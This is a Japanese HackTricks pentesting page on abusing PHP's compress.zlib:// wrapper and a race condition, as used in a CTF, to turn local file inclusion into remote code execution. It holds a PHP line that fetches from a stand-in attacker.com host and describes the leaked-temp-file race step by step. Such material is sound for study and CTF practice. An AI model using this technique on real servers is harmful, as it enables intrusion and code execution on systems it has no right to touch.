<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、当社の独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションを発見する
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦で**フォロー**する：[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>


## `compress.zlib://` および `PHP_STREAM_PREFER_STDIO`

フラグ `PHP_STREAM_PREFER_STDIO` を使用してプロトコル `compress.zlib://` で開かれたファイルは、後から接続に到着するデータを同じファイルに書き込み続けることができます。

これは、次のような呼び出しを意味します：
```php
file_get_contents("compress.zlib://http://attacker.com/file")
```
以下のようにhttp://attacker.com/fileをリクエストするリクエストを送信し、サーバーは有効なHTTPレスポンスでリクエストに応答し、接続を開いたままにしておき、後で追加のデータを送信し、それがファイルに書き込まれる可能性があります。

あなたは、php-srcコードのmain/streams/cast.cのこの部分でその情報を見ることができます。
```c
/* Use a tmpfile and copy the old streams contents into it */

if (flags & PHP_STREAM_PREFER_STDIO) {
*newstream = php_stream_fopen_tmpfile();
} else {
*newstream = php_stream_temp_new();
}
```
## RCEへのRace Condition

[**このCTF**](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer) は前回のトリックを使用して解決されました。

攻撃者は、**`compress.zlib`** プロトコルを使用して、**被害者サーバーに攻撃者のサーバーからファイルを読み取るようにさせます**。

この**接続が存在する間**、攻撃者は、サーバーによって**漏洩された一時ファイルのパスを外部に送信**します。

**接続がまだ開いている間**、攻撃者は、自分が制御している一時ファイルを**ロードするLFIを悪用**します。

ただし、Webサーバーには、`<?` を含むファイルをロードすることを**防ぐチェック**があります。そのため、攻撃者は**Race Condition**を悪用します。まだ開いている接続で、**攻撃者**は、Webサーバーが**ファイルに禁止された文字が含まれているかを確認**した後に**PHPペイロードを送信**しますが、**その内容をロードする前**に送信します。

詳細については、Race ConditionとCTFの説明を[こちら](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer)で確認してください。
